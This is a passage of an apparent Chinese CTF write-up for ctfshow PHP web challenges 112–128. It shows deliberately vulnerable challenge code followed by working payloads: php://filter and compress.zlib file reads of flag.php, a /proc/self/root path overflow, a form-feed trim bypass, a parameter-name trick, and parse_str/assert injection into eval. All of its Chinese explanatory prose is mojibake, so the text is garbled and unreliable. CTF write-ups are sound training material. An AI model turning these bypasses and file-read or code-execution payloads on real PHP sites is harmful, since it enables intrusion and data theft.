å¸¸é‡æ•°ç»„ï¼Œå…¶ä¸­åŒ…å«äº† $flag é”®å€¼å¯¹ï¼Œå°±å¯ä»¥å°† $flag çš„å€¼èµ‹ç»™ $$v1</li></ol><p>Payloadï¼š<code>?v1=ctfshow&amp;v2=GLOBALS</code></p><h4 id="web112-is-file"><a href="#web112-is-file" class="headerlink" title="web112(is_file)"></a>web112(is_file)</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">function</span> <span class="token function-definition function">filter</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/\.\.\/|http|https|data|input|rot13|base64|string/i'</span><span class="token punctuation">,</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"hacker!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token variable">$file</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token variable">$file</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span> <span class="token function">is_file</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token function">filter</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"hacker!"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> </code></pre><p>è¦æ±‚ä¼ å…¥çš„fileä¸æ˜¯æ–‡ä»¶ï¼Œä½†è¿˜èƒ½highlight_fileï¼Œè¿™å°±è¦è¯´æ˜is_fileå’Œhighlight_fileå¯¹äºæ–‡ä»¶çš„åˆ¤æ–­ï¼šis_fileè®¤ä¸ºä¼ªåè®®ä¸æ˜¯æ–‡ä»¶ï¼Œhighlight_fileè®¤ä¸ºä¼ªåè®®æ˜¯æ–‡ä»¶ï¼Œæ‰€ä»¥è¿™é‡Œä¼ å…¥filterä¼ªåè®®å³å¯ã€‚</p><p>Payload:</p><blockquote><p>php:&#x2F;&#x2F;filter&#x2F;resource&#x3D;flag.php<br>php:&#x2F;&#x2F;filter&#x2F;convert.iconv.UCS-2LE.UCS-2BE&#x2F;resource&#x3D;flag.php<br>php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.quoted-printable-encode&#x2F;resource&#x3D;flag.php<br>compress.zlib:&#x2F;&#x2F;flag.php</p></blockquote><p><a href="https://www.novel.tools/decode/UCS-2BE">UCS-2BE Text Decoder</a></p><h4 id="web113"><a href="#web113" class="headerlink" title="web113"></a>web113</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">function</span> <span class="token function-definition function">filter</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/filter|\.\.\/|http|https|data|data|rot13|base64|string/i'</span><span class="token punctuation">,</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'hacker!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token variable">$file</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token variable">$file</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span> <span class="token function">is_file</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token function">filter</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"hacker!"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p>1.åˆ©ç”¨å‡½æ•°æ‰€èƒ½å¤„ç†çš„é•¿åº¦é™åˆ¶è¿›è¡Œç›®å½•æº¢å‡ºï¼š åŸç†ï¼š&#x2F;proc&#x2F;self&#x2F;rootä»£è¡¨æ ¹ç›®å½•ï¼Œè¿›è¡Œç›®å½•æº¢å‡ºï¼Œè¶…è¿‡is_fileèƒ½å¤„ç†çš„æœ€å¤§é•¿åº¦å°±ä¸è®¤ä¸ºæ˜¯ä¸ªæ–‡ä»¶äº†ã€‚ payload: <code>file=/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/p roc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/pro c/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/ self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/se lf/root/proc/self/root/var/www/html/flag.php</code></p><p>2.åˆ©ç”¨phpä¸­zipä¼ªåè®® ç”¨æ³•[æºäºphpå®˜æ–¹æä¾›çš„ä¸€äº›ä¾‹å­]ï¼š compress.zlib:&#x2F;&#x2F;file.gz compress.zlib:&#x2F;&#x2F;file.bz2 payload: <code>file=compress.zlib://flag.php</code></p><h4 id="web114"><a href="#web114" class="headerlink" title="web114"></a>web114</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">function</span> <span class="token function-definition function">filter</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/compress|root|zip|convert|\.\.\/|http|https|data|data|rot13|base64|string/i'</span><span class="token punctuation">,</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'hacker!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token variable">$file</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token variable">$file</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"å¸ˆå‚…ä»¬å±…ç„¶tqléƒ½æ˜¯éé¢„æœŸ å“¼ï¼"</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span> <span class="token function">is_file</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token function">filter</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"hacker!"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p>æŠŠfilteræ”¾å‡ºæ¥äº†ï¼Œç›´æ¥è¯»</p><h4 id="web115-fç»•è¿‡is-numberic-trim"><a href="#web115-fç»•è¿‡is-numberic-trim" class="headerlink" title="web115(\fç»•è¿‡is_numberic()+trim())"></a>web115(\fç»•è¿‡is_numberic()+trim())</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">function</span> <span class="token function-definition function">filter</span><span class="token punctuation">(</span><span class="token variable">$num</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$num</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"0x"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"1"</span><span class="token punctuation">,</span><span class="token variable">$num</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$num</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"0"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"1"</span><span class="token punctuation">,</span><span class="token variable">$num</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$num</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"."</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"1"</span><span class="token punctuation">,</span><span class="token variable">$num</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$num</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"e"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"1"</span><span class="token punctuation">,</span><span class="token variable">$num</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$num</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"+"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"1"</span><span class="token punctuation">,</span><span class="token variable">$num</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token variable">$num</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$num</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'num'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$num</span><span class="token punctuation">)</span> <span class="token keyword">and</span> <span class="token variable">$num</span><span class="token operator">!==</span><span class="token string single-quoted-string">'36'</span> <span class="token keyword">and</span> <span class="token function">trim</span><span class="token punctuation">(</span><span class="token variable">$num</span><span class="token punctuation">)</span><span class="token operator">!==</span><span class="token string single-quoted-string">'36'</span> <span class="token keyword">and</span> <span class="token function">filter</span><span class="token punctuation">(</span><span class="token variable">$num</span><span class="token punctuation">)</span><span class="token operator">==</span><span class="token string single-quoted-string">'36'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$num</span><span class="token operator">==</span><span class="token string single-quoted-string">'36'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"hacker!!"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"hacker!!!"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p><strong>trim()</strong> å‡½æ•°ç§»é™¤å­—ç¬¦ä¸²ä¸¤ä¾§çš„ç©ºç™½å­—ç¬¦æˆ–å…¶ä»–é¢„å®šä¹‰å­—ç¬¦ã€‚</p><p>ä¸€èˆ¬æ˜¯ç”¨æ¥å»é™¤å­—ç¬¦ä¸²é¦–å°¾å¤„çš„ç©ºç™½å­—ç¬¦ï¼ˆæˆ–è€…å…¶ä»–å­—ç¬¦ï¼‰ï¼Œä¸€èˆ¬åœ¨ç”¨åœ¨æœåŠ¡ç«¯å¯¹æ¥æ”¶çš„ç”¨æˆ·æ•°æ®è¿›è¡Œå¤„ç†ï¼Œä»¥å…æŠŠç”¨æˆ·è¯¯è¾“å…¥çš„ç©ºæ ¼å­˜å‚¨åˆ°æ•°æ®åº“ï¼Œä¸‹æ¬¡å¯¹æ¯”æ•°æ®æ—¶å€™å‡ºé”™ã€‚</p><p>filterè®©æˆ‘ä»¬æ²¡æ³•è½¬è¿›åˆ¶ç»•è¿‡ï¼Œè¿™é“é¢˜çš„å…³é”®åœ¨äºå¦‚ä½•ç»•è¿‡trimï¼Œæ¨æµ‹éœ€è¦ç‰¹æ®Šå­—ç¬¦ï¼Œæ‰€ä»¥æˆ‘ä»¬å†™ä¸ªè„šæœ¬fuzzä¸€ä¸‹ï¼š</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">function</span> <span class="token function-definition function">filter</span><span class="token punctuation">(</span><span class="token variable">$num</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$num</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"0x"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"1"</span><span class="token punctuation">,</span><span class="token variable">$num</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$num</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"0"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"1"</span><span class="token punctuation">,</span><span class="token variable">$num</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$num</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"."</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"1"</span><span class="token punctuation">,</span><span class="token variable">$num</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$num</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"e"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"1"</span><span class="token punctuation">,</span><span class="token variable">$num</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$num</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"+"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"1"</span><span class="token punctuation">,</span><span class="token variable">$num</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token variable">$num</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$i</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span><span class="token variable">$i</span><span class="token operator">&lt;</span><span class="token number">129</span><span class="token punctuation">;</span><span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$num</span><span class="token operator">=</span><span class="token function">chr</span><span class="token punctuation">(</span><span class="token variable">$i</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string single-quoted-string">'36'</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$num</span><span class="token punctuation">)</span> <span class="token keyword">and</span> <span class="token variable">$num</span><span class="token operator">!==</span><span class="token string single-quoted-string">'36'</span> <span class="token keyword">and</span> <span class="token function">trim</span><span class="token punctuation">(</span><span class="token variable">$num</span><span class="token punctuation">)</span><span class="token operator">!==</span><span class="token string single-quoted-string">'36'</span> <span class="token keyword">and</span> <span class="token function">filter</span><span class="token punctuation">(</span><span class="token variable">$num</span><span class="token punctuation">)</span><span class="token operator">==</span><span class="token string single-quoted-string">'36'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token function">chr</span><span class="token punctuation">(</span><span class="token variable">$i</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token punctuation">&#125;</span></span></code></pre><p>Payload:<code>?num=%0c36</code></p><p>trimå‡½æ•°ä¼šè¿‡æ»¤ç©ºæ ¼ä»¥åŠ<code>\n\r\t\v\0</code>ï¼Œä½†ä¸ä¼šè¿‡æ»¤<code>\f</code></p><h4 id="web123-ä¸‹åˆ’çº¿-ç»•è¿‡"><a href="#web123-ä¸‹åˆ’çº¿-ç»•è¿‡" class="headerlink" title="web123(ä¸‹åˆ’çº¿_ç»•è¿‡)"></a>web123(ä¸‹åˆ’çº¿_ç»•è¿‡)</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">=</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'argv'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$c</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'fun'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'CTF_SHOW'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">&amp;&amp;</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'CTF_SHOW.COM'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">&amp;&amp;</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'fl0g'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/\\\\|\/|\~|\`|\!|\@|\#|\%|\^|\*|\-|\+|\=|\&#123;|\&#125;|\"|\'|\,|\.|\;|\?/"</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">)</span><span class="token operator">&amp;&amp;</span><span class="token variable">$c</span><span class="token operator">&lt;=</span><span class="token number">18</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>         <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"<span class="token interpolation"><span class="token variable">$c</span></span>"</span><span class="token operator">.</span><span class="token string double-quoted-string">";"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>           <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$fl0g</span><span class="token operator">===</span><span class="token string double-quoted-string">"flag_give_me"</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>             <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>         <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span> </code></pre><p>åœ¨phpä¸­å˜é‡ååªæœ‰æ•°å­—å­—æ¯ä¸‹åˆ’çº¿ï¼Œè¢«getæˆ–è€…postä¼ å…¥çš„å˜é‡åï¼Œå¦‚æœå«æœ‰ç©ºæ ¼ã€+ã€[åˆ™ä¼šè¢«è½¬åŒ–ä¸º_ï¼Œæ‰€ä»¥æŒ‰ç†æ¥è¯´æˆ‘ä»¬æ„é€ ä¸å‡ºCTF_SHOW.COMè¿™ä¸ªå˜é‡(å› ä¸ºå«æœ‰.)ï¼Œä½†phpä¸­æœ‰ä¸ªç‰¹æ€§å°±æ˜¯å¦‚æœä¼ å…¥[ï¼Œå®ƒè¢«è½¬åŒ–ä¸º_ä¹‹åï¼Œåé¢çš„å­—ç¬¦å°±ä¼šè¢«ä¿ç•™ä¸‹æ¥ä¸ä¼šè¢«æ›¿æ¢</p><p>Payload:<code>CTF_SHOW=&amp;CTF[SHOW.COM=&amp;fun=echo $flag</code></p><h4 id="web125-SERVER-â€˜argvâ€™-ç»•è¿‡"><a href="#web125-SERVER-â€˜argvâ€™-ç»•è¿‡" class="headerlink" title="web125($_SERVER[â€˜argvâ€™]ç»•è¿‡)"></a>web125($_SERVER[â€˜argvâ€™]ç»•è¿‡)</h4><p>åˆ©ç”¨$_SERVER[â€˜argvâ€™]</p><blockquote><p>parse_str(ï¼‰å‡½æ•°æŠŠæŸ¥è¯¢å­—ç¬¦ä¸²è§£æåˆ°å˜é‡ä¸­ã€‚<br>æ³¨é‡Šï¼šå¦‚æœæœªè®¾ç½®arrayå‚æ•°ï¼Œåˆ™ç”±è¯¥å‡½æ•°è®¾ç½®çš„å˜é‡å°†è¦†ç›–å·²å­˜åœ¨çš„åŒåå˜é‡ã€‚<br>æ³¨é‡Šï¼šphp.ini æ–‡ä»¶ä¸­çš„ magic_quotes_gpc è®¾ç½®å½±å“è¯¥å‡½æ•°çš„è¾“å‡ºã€‚å¦‚æœå·²å¯ç”¨ï¼Œé‚£ä¹ˆåœ¨ parse_strOï¼‰è§£æä¹‹å‰ï¼Œå˜é‡ä¼šè¢« addslashesOè½¬æ¢ã€‚</p></blockquote><p>$_SERVER æ˜¯ä¸€ä¸ªåŒ…å«äº†è¯¸å¦‚å¤´ä¿¡æ¯(header)ã€è·¯å¾„(path)ã€ä»¥åŠè„šæœ¬ä½ç½®(script locations)ç­‰ç­‰ä¿¡æ¯çš„æ•°ç»„ã€‚è¿™ä¸ªæ•°ç»„ä¸­çš„é¡¹ç›®ç”± Web æœåŠ¡å™¨åˆ›å»ºã€‚</p><p>â€˜argvâ€™</p><p>ä¼ é€’ç»™è¯¥è„šæœ¬çš„å‚æ•°çš„æ•°ç»„ã€‚å½“è„šæœ¬ä»¥å‘½ä»¤è¡Œæ–¹å¼è¿è¡Œæ—¶ï¼Œargv å˜é‡ä¼ é€’ç»™ç¨‹åº C è¯­è¨€æ ·å¼çš„å‘½ä»¤è¡Œå‚æ•°ã€‚å½“é€šè¿‡ GET æ–¹å¼è°ƒç”¨æ—¶ï¼Œè¯¥å˜é‡åŒ…å«query stringã€‚</p><p>æ„æ€å°±æ˜¯é€šè¿‡$_SERVER[â€˜argvâ€™]å°†$aå˜æˆæ•°ç»„ï¼Œå†åˆ©ç”¨æ•°ç»„çš„æ€§è´¨å°†fl0g&#x3D;flag_give_meä¼ å…¥ï¼ŒåŒæ—¶è¿˜ç»•è¿‡ç¬¬ä¸€ä¸ªifä¸­çš„!isset($_GET[â€˜fl0gâ€™]))ï¼Œç”¨+æ¥è¿›è¡Œåˆ†éš”ï¼Œä½¿å¾—æ•°ç»„ä¸­æœ‰å¤šä¸ªæ•°å€¼ã€‚</p><p>æ‰§è¡Œevalå‡½æ•°ä¹Ÿå°±æ˜¯æ‰§è¡Œ$cå³æ˜¯parse_str($a[1])ï¼Œä½¿å¾—fl0g&#x3D;flag_give_meï¼Œä»è€Œè¿›å…¥ç¬¬ä¸‰ä¸ªifè¯­å¥ã€‚</p><p>Payload:</p><blockquote><p>GET:?1&#x3D;flag.php </p><p>POST:CTF_SHOW&#x3D;&amp;CTF[SHOW.COM&#x3D;&amp;fun&#x3D;highlight_file($_GET[1])</p><p>GET:?a&#x3D;1++fl0g&#x3D;flag_give_me</p><p>POST:CTF_SHOW&#x3D;&amp;CTF[SHOW.COM&#x3D;&amp;fun&#x3D;parse_str($a[1])</p><p>GET:?a&#x3D;1++fl0g&#x3D;flag_give_me</p><p>POST:CTF_SHOW&#x3D;&amp;CTF[SHOW.COM&#x3D;&amp;fun&#x3D;assert($a[0])</p></blockquote><h4 id="web126"><a href="#web126" class="headerlink" title="web126"></a>web126</h4><p>PayloadåŒä¸Š</p><h4 id="web127-extractå˜é‡è¦†ç›–-SERVER-â€˜QUERY-STRINGâ€™"><a href="#web127-extractå˜é‡è¦†ç›–-SERVER-â€˜QUERY-STRINGâ€™" class="headerlink" title="web127(extractå˜é‡è¦†ç›– $_SERVER[â€˜QUERY_STRINGâ€™])"></a>web127(extractå˜é‡è¦†ç›– $_SERVER[â€˜QUERY_STRINGâ€™])</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$ctf_show</span> <span class="token operator">=</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$flag</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$url</span> <span class="token operator">=</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'QUERY_STRING'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token comment">//ç‰¹æ®Šå­—ç¬¦æ£€æµ‹</span><span class="token keyword">function</span> <span class="token function-definition function">waf</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/\`|\~|\!|\@|\#|\^|\*|\(|\)|\\$|\_|\-|\+|\&#123;|\;|\:|\[|\]|\&#125;|\'|\"|\&lt;|\,|\>|\.|\\\|\//'</span><span class="token punctuation">,</span> <span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">waf</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"å—¯å“¼ï¼Ÿ"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token function">extract</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$ctf_show</span><span class="token operator">===</span><span class="token string single-quoted-string">'ilove36d'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span></code></pre><p><strong>extract()</strong> å‡½æ•°ä»æ•°ç»„ä¸­å°†å˜é‡å¯¼å…¥åˆ°å½“å‰çš„ç¬¦å·è¡¨ã€‚</p><p><code>.</code>å’Œ<code>[</code>è¢«è¿‡æ»¤äº†å¯ä»¥ä½¿ç”¨<code> </code>(ç©ºæ ¼)æ¥è¿‡æ»¤</p><p>**$SERVER[â€˜QUERY_STRINGâ€™];**è·å–çš„æŸ¥è¯¢è¯­å¥æ˜¯æœåŠ¡ç«¯è¿˜æ²¡urlè§£ç ä¹‹å‰çš„å­—ç¬¦ä¸²ï¼Œæ‰€ä»¥å¯¹<code>_</code>è¿›è¡Œä¸€æ¬¡urlç¼–ç ä¹Ÿèƒ½ç»•è¿‡ã€‚</p><p>Payload:<code>?ctf%5fshow=ilove36d</code></p><h4 id="web128-gettext"><a href="#web128-gettext" class="headerlink" title="web128(gettext-&gt;_())"></a>web128(gettext-&gt;_())</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$f1</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string 